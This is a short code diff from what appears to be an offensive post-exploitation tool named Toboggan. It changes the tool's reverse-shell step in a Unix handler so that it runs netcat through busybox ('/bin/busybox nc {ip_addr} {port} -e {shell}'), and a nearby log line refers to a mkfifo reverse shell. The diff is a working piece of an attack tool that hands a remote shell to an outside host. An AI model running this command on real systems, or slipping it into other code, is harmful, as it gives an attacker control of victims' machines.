@@ -247,7 +247,7 @@ class UnixHandler(OSHandler):
                 print(f"[Toboggan] mkfifo revershell sent.")
             else:
                 self._execute(
-                    f"nc {ip_addr} {port} -e {shell}",
+                    f"/bin/busybox nc {ip_addr} {port} -e {shell}",
                     timeout=2,
                     retry=False,
                 )
